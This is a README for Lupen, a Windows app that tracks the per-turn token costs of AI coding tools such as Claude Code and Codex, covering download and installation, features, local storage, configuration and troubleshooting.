# 🔍 Lupen - Track your AI coding costs easily

[https://github.com/sunildh4270/Lupen/releases](https://img.shields.io/badge/Download-Lupen-blue)

Lupen tracks the financial cost of your AI coding sessions. It monitors how much you spend when you use tools like Claude Code or Codex. The app works on your computer and keeps your data local. You see your spending by turn, which helps you manage your budget as you write code.

## 📥 Getting Started

You need a Windows computer to use Lupen. Follow these steps to install the software.

1. Go to the [official release page](https://github.com/sunildh4270/Lupen/releases) to download the installer.
2. Select the file named Lupen-Setup.exe to start the download.
3. Open the file once it finishes downloading. 
4. Follow the prompts on your screen to complete the installation.
5. Click the Lupen icon on your desktop to open the application.

## 🛠 Features

Lupen provides clear insights into how your coding tools use tokens. Tokens represent the words or parts of words that AI models process. Each token costs money based on the provider of the AI model. 

*   **Cost Tracking:** The app records every interaction with your AI coding tool. It converts token usage into a currency value.
*   **Verification:** You see exactly which turns in your conversation caused specific charges. This level of detail helps you spot inefficient coding patterns.
*   **Local Storage:** All your data stays on your machine. The app does not send your spending history to an external server. You own your information at all times.
*   **User Interface:** The interface stays out of your way while you work. It updates in real-time as you receive responses from the AI.

## 🖥 System Requirements

Lupen works on standard Windows machines. Ensure your computer meets these conditions for the best experience:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4GB of RAM is suggested.
*   **Storage:** 100MB of free disk space is enough for the app and your local logs.
*   **Internet Connection:** You only need an internet connection while your AI coding tools run. Lupen does not require a connection to track data locally.

## 📊 How to Read Your Stats

Lupen displays your spending in a simple list. Each entry corresponds to one turn in your chat.

*   **Turn ID:** The chronological number of the chat exchange.
*   **Token Count:** How many tokens the model consumed for that specific step.
*   **Cost:** The calculated price in dollars. 
*   **Date:** The exact time you performed the action.

You can sort these columns to see which parts of your project cost the most. If you find a specific coding task uses too many tokens, you can adjust your requests to save money.

## 🔐 Privacy and Security

Data privacy remains a core feature of Lupen. Many tracking tools send your usage data to the cloud. Lupen handles everything on your local drive. Nobody sees your coding history or your spending habits because the data never leaves your computer. 

If you decide to uninstall the app, you can delete the local database folder found in your documents directory. This ensures that no trace of your activity remains on your machine.

## 💡 Managing AI Costs

AI tools save time, but they can be expensive if you do not watch your usage. Lupen acts as your dashboard for this activity. Use these habits to stay within your budget:

1.  Check the total cost at the end of each session.
2.  Review high-cost turns to understand why the AI used more tokens than expected. Sometimes a long prompt or a complex code change creates a large bill. 
3.  Set a mental limit for each project. Closing the app and resetting your count helps you stay disciplined.

## ⚙️ Configuration

Lupen comes ready to use. You do not need to change complicated settings. During your first run, the app looks for your AI configuration files. If you find that the app does not show your costs, check your provider settings. 

The app reads usage from the standard paths used by Claude Code and Codex. If you use a custom path for your logs, you can point Lupen to that folder under the Tools menu.

## 🆘 Troubleshooting

*   **App does not show costs:** Verify that your AI coding tool is currently active and writing logs. Lupen cannot track usage if the tool is not running. 
*   **High memory usage:** If the app runs slowly, restart it. It might struggle if it processes a massive log file from a long-running project.
*   **Installation errors:** Run the setup file as an administrator. Right-click the icon and choose "Run as administrator" to grant it permission to install correctly.
